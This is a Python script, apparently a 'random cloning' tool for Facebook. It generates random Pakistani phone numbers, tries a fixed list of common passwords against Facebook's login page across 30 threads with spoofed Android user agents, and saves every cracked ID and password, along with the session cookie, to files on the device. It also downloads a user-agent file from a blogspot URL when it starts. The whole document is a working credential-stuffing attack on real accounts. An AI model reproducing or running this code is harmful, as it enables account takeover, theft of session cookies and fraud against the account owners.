from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Shezy.py')
from bs4 import BeautifulSoup
ugen = []
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
KB = '{ KB }'
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
try:
    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
except:
    pass
sock=open('ua.html','r').read().splitlines()
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text
        ua=open('.user-agents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.user-agents.txt','r').read().splitlines()
loop = 0
cps = []
oks = []
twf = []

def clear():
    os.system('clear')
    print(logo)
logo =f"""____________________
 \033[1;33mAUTHOR    : Shezy XD
 \033[1;35mFACEBOOK  : Shezy Malik
 \033[1;33mVERSION   : 0.2
 \033[1;36mSTATUS    : PRIVATE 
 \033[1;337mTEAM      : NADIR & SHAKIR & SAJJAD 
\033[1;32m                               [ALWAYS BE A SIGMA BRO]
____________________"""


#####     ####




def linex():
    print(f'==========================================================')
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mKB-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mKB-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mKB-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
twf = []
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS ðŸŽ®%s  '%(ORANGE))
    else:
        print(f'\r {GREEN}[âˆš] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS ðŸŽ®%s'%(ORANGE))
    else:
        print(f'\r ðŸŽ®  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"{GREEN}[âˆš]---------------------------------------------------[âˆš]")
    #____________#
def xyz():
    #os.system("play-audio WELCOME_TO_kb_BOOT_818.mp3")
    os.getuid
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f"[01] {WHITE}START RANDOM CLONING")
    print(f"[00] {WHITE}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m========================================================")
    Shezy = input("[âˆš] CHOOSE : ")
    if Shezy in ["1","01"]:
        Random()
    elif Shezy in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()

#_____________#
 
#_____________________#

def Random():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :ðŸ‘‡\033[0;m]")
    print(f"")
    print(' 0306 ,0300 ,0315 ,0333')
    print(f" 0347 ,0342 ,0345 ,0349")
    print(f" 0310 ,0316 ,0312 ,0309")
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {BLUE}TOTAL IDZ             : {RED}"+tl)
        print(f" {WHITE}COUNTRY YOU CHOOSE    : PAKISTAN ")
        print(f" {WHITE}NUMBER YOU PUT        : {RED}"+code)
        print(f" {WHITE}PROCESS HAS BEEN STARTED")
        print(f" {WHITE}BE PATIENT.......")
        print(f" {WHITE}TO STOP PROCESS Ctrl + Z ")
        print(f'===========================================================')
        for love in user:
            uid = code+love
            pwx = [love,'khan123','khan1122','khankhan','khan786','ali123','ali786','786786','freefire', 'pakistan','pubg@123','ali1122','000786']
            yaari.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global oks
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(["Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) 5G Build/S1RSS32.38-20-9-11)","Dalvik/2.1.0 (Linux; U; Android 11; TW102 Build/TW102.01.03)","Dalvik/2.1.0 (Linux; U; Android 11; KB2003 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 10; S600 MAX Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TQ3A.230605.012.A1)","Dalvik/2.1.0 (Linux; U; Android 13; M2103K19Y Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; BennyM Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; 22127RK46C Build/TKQ1.220905.001)","Dalvik/2.1.0 (Linux; U; Android 7.0; C9 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; QUAD-CORE T3 k2001-nwd Build/NMF27D)","Dalvik/2.1.0 (Linux; U; Android 9; projector Build/PQ3B.190605.006)","Dalvik/2.1.0 (Linux; U; Android 12; Lenovo TB-X6C6F Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; Tab 11 SE Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; Tv Hub Mini Build/RTT0.210618.003)","Dalvik/2.1.0 (Linux; U; Android 9.0; S108 Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 11; Orb S Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ3A.230605.011)","Dalvik/2.1.0 (Linux; U; Android 12; MP0101635 Build/SQ1D.211205.016.A5)","Dalvik/2.1.0 (Linux; U; Android 5.1; Panasonic T30 Build/Panasonic-T30)","Dalvik/2.1.0 (Linux; U; Android 11; dedede Build/R114-15437.42.0)","Dalvik/2.1.0 (Linux; U; Android 12; W2 Build/RD2A.211001.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-T733 Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; M2102J20SG Build/SKQ1.211006.001) AppleWebKit [PB/111]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; LM-X510.FG Build/O00623) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SG32.39-181)","Dalvik/2.1.0 (Linux; U; Android 11; zork Build/R114-15437.42.0)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus (2022) Build/S3RDES32.123-37-4-1)","Dalvik/2.1.0 (Linux; U; Android 9; KFMUWI Build/PS7327.3329N)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3741 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; Nubia 4010 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 9.1;  HF-16CJ Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)","Dalvik/2.1.0 (Linux; U; Android 11; MID4G64PR002 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10; moto g(9) play Build/QPX30.30-Q3-38-72)","Dalvik/2.1.0 (Linux; U; Android 9; ZC-339 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 13; Infinix X6716B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; STG_C10 Build/P00610)","Dalvik/2.1.0 (Linux; U; Android 11; WP15 S Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ3A.230605.011)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-T560NU Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 13; 22041219G Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola razr 40 ultra Build/T1TZ33.3-62-25)","Dalvik/2.1.0 (Linux; U; Android 11; TC21 Build/11-20-18.00-RG-U00-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 11; SUGAR C60 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X665C Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; SO-53C Build/63.1.B.1.113)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; LIONS1 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; Neffos X20 Build/PPR1.180610.011) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8T Build/RKQ1.201004.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A326U Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; NX669J Build/SKQ1.220502.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; vivo 1718 Build/OPM1.171019.026) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; M2103K19G Build/SP1A.210812.016) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; SMART_L104_eea Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 10; Motorola Defy Build/QZD30.62)","Dalvik/2.1.0 (Linux; U; Android 12; moto g32 Build/S2SNS32.34-60-7)","Dalvik/2.1.0 (Linux; U; Android 12; Android SDK built for x86_64 Build/SE1A.220621.001)","Dalvik/2.1.0 (Linux; U; Android 12; RMX3627 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook R13 (CB5-312T) Build/R114-15437.42.0)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-6-8)","Dalvik/2.1.0 (Linux; U; Android 13; 22122RK93C Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRPWI Build/PS7328.3435N)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.460)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ54 Build/64.1.A.0.929)","Dalvik/2.1.0 (Linux; U; Android 9; AFTKA Build/PS7646.3554N)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; 21061119DG Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT54 Build/64.1.A.0.929)","dalvik/2.1.0 (linux; u; android 8.1.0; s102x_32 build/opm1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; M2003J15SC Build/SP1A.210812.016) AppleWebKit [PB/111]","Dalvik/1.6.0 (Linux; U; Android 12/Viber 18.1.1.0 ; SM-M315FSP1A.210812.016) Viber/20.2.3.0","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ52 Build/61.2.A.0.460)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; FJL22 Build/V12R53F)","Dalvik/2.1.0 (Linux; U; Android 11; puff Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 12; TNA-AN00 Build/HONORTNA-AN00)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3435N)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ3A.230605.012)","Dalvik/2.1.0 (Linux; U; Android 12; Stratus_C7 Build/SP1A.230428.1527)","Dalvik/2.1.0 (Linux; U; Android 9; W7 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; 23046RP50C Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 12; Nokia 2.4 Build/SP1A.210812.016) AppleWebKit [PB/111]","Dalvik/2.1.0 (Linux; U; Android 13; V2121A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; V2109-EG Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10; TC26 Build/10-16-10.00-QG-U79-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 9; KFMAWI Build/PS7327.3329N)","Dalvik/2.1.0 (Linux; U; Android 11; MH-T6000 Build/MH-T6000V1.0.0B011)","Dalvik/2.1.0 (Linux; U; Android 13; TECNO CK7n Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; benz_knz1920x720 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R114-15437.42.0)","Dalvik/2.1.0 (Linux; U; Android 10; CPH2185 Build/QP1A.190711.020) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; 22011119UY Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; Murena One Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 10; OzoneHD Neo Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; SM-E5260 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; M2007J22C Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; C6930 Build/RKQ1.220301.001)","Dalvik/2.1.0 (Linux; U; Android 10; Titan_1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9; AEOAT Build/PS7559.3533N)","Dalvik/2.1.0 (Linux; U; Android 12; itel A631L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; AEOAT Build/PS7504.3919N)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) 5G Build/S1RSS32.38-20-9-11)","Dalvik/2.1.0 (Linux; U; Android 11; TW102 Build/TW102.01.03)","Dalvik/2.1.0 (Linux; U; Android 11; KB2003 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 10; S600 MAX Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TQ3A.230605.012.A1)","Dalvik/2.1.0 (Linux; U; Android 13; M2103K19Y Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; BennyM Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; 22127RK46C Build/TKQ1.220905.001)","Dalvik/2.1.0 (Linux; U; Android 7.0; C9 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; QUAD-CORE T3 k2001-nwd Build/NMF27D)","Dalvik/2.1.0 (Linux; U; Android 9; projector Build/PQ3B.190605.006)","Dalvik/2.1.0 (Linux; U; Android 12; Lenovo TB-X6C6F Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; Tab 11 SE Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; Tv Hub Mini Build/RTT0.210618.003)","Dalvik/2.1.0 (Linux; U; Android 9.0; S108 Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 11; Orb S Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ3A.230605.011)","Dalvik/2.1.0 (Linux; U; Android 12; MP0101635 Build/SQ1D.211205.016.A5)","Dalvik/2.1.0 (Linux; U; Android 5.1; Panasonic T30 Build/Panasonic-T30)","Dalvik/2.1.0 (Linux; U; Android 11; dedede Build/R114-15437.42.0)","Dalvik/2.1.0 (Linux; U; Android 12; W2 Build/RD2A.211001.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-T733 Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; M2102J20SG Build/SKQ1.211006.001) AppleWebKit [PB/111]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; LM-X510.FG Build/O00623) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SG32.39-181)","Dalvik/2.1.0 (Linux; U; Android 11; zork Build/R114-15437.42.0)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus (2022) Build/S3RDES32.123-37-4-1)","Dalvik/2.1.0 (Linux; U; Android 9; KFMUWI Build/PS7327.3329N)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3741 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; Nubia 4010 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 9.1;  HF-16CJ Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)","Dalvik/2.1.0 (Linux; U; Android 11; MID4G64PR002 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10; moto g(9) play Build/QPX30.30-Q3-38-72)","Dalvik/2.1.0 (Linux; U; Android 9; ZC-339 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 13; Infinix X6716B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; STG_C10 Build/P00610)","Dalvik/2.1.0 (Linux; U; Android 11; WP15 S Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ3A.230605.011)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-T560NU Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 13; 22041219G Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola razr 40 ultra Build/T1TZ33.3-62-25)","Dalvik/2.1.0 (Linux; U; Android 11; TC21 Build/11-20-18.00-RG-U00-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 11; SUGAR C60 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X665C Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; SO-53C Build/63.1.B.1.113)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; LIONS1 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; Neffos X20 Build/PPR1.180610.011) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8T Build/RKQ1.201004.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A326U Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; NX669J Build/SKQ1.220502.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; vivo 1718 Build/OPM1.171019.026) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; M2103K19G Build/SP1A.210812.016) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; SMART_L104_eea Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 10; Motorola Defy Build/QZD30.62)","Dalvik/2.1.0 (Linux; U; Android 12; moto g32 Build/S2SNS32.34-60-7)","Dalvik/2.1.0 (Linux; U; Android 12; Android SDK built for x86_64 Build/SE1A.220621.001)","Dalvik/2.1.0 (Linux; U; Android 12; RMX3627 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook R13 (CB5-312T) Build/R114-15437.42.0)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-6-8)","Dalvik/2.1.0 (Linux; U; Android 13; 22122RK93C Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRPWI Build/PS7328.3435N)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.460)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ54 Build/64.1.A.0.929)","Dalvik/2.1.0 (Linux; U; Android 9; AFTKA Build/PS7646.3554N)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; 21061119DG Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT54 Build/64.1.A.0.929)","dalvik/2.1.0 (linux; u; android 8.1.0; s102x_32 build/opm1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; M2003J15SC Build/SP1A.210812.016) AppleWebKit [PB/111]","Dalvik/1.6.0 (Linux; U; Android 12/Viber 18.1.1.0 ; SM-M315FSP1A.210812.016) Viber/20.2.3.0","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ52 Build/61.2.A.0.460)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; FJL22 Build/V12R53F)","Dalvik/2.1.0 (Linux; U; Android 11; puff Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 12; TNA-AN00 Build/HONORTNA-AN00)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3435N)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ3A.230605.012)","Dalvik/2.1.0 (Linux; U; Android 12; Stratus_C7 Build/SP1A.230428.1527)","Dalvik/2.1.0 (Linux; U; Android 9; W7 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; 23046RP50C Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 12; Nokia 2.4 Build/SP1A.210812.016) AppleWebKit [PB/111]","Dalvik/2.1.0 (Linux; U; Android 13; V2121A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; V2109-EG Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10; TC26 Build/10-16-10.00-QG-U79-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 9; KFMAWI Build/PS7327.3329N)","Dalvik/2.1.0 (Linux; U; Android 11; MH-T6000 Build/MH-T6000V1.0.0B011)","Dalvik/2.1.0 (Linux; U; Android 13; TECNO CK7n Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; benz_knz1920x720 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R114-15437.42.0)","Dalvik/2.1.0 (Linux; U; Android 10; CPH2185 Build/QP1A.190711.020) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; 22011119UY Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; Murena One Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 10; OzoneHD Neo Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; SM-E5260 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; M2007J22C Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; C6930 Build/RKQ1.220301.001)","Dalvik/2.1.0 (Linux; U; Android 10; Titan_1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9; AEOAT Build/PS7559.3533N)","Dalvik/2.1.0 (Linux; U; Android 12; itel A631L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; AEOAT Build/PS7504.3919N)",])
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'x.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\033[1;32m[âˆš]---------------------[Shezy-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                cek_apk(session,coki)
                open('/sdcard/Shezy-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[Ã—]--------------------[Shezy-Cp]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')
                open('/sdcard/Shezy-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[7:22]
                Red = '\033[1;31m'
                print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
                open('/sdcard/Jadugar-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Shezy] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass

        
 
if __name__ == '__main__':
    xyz()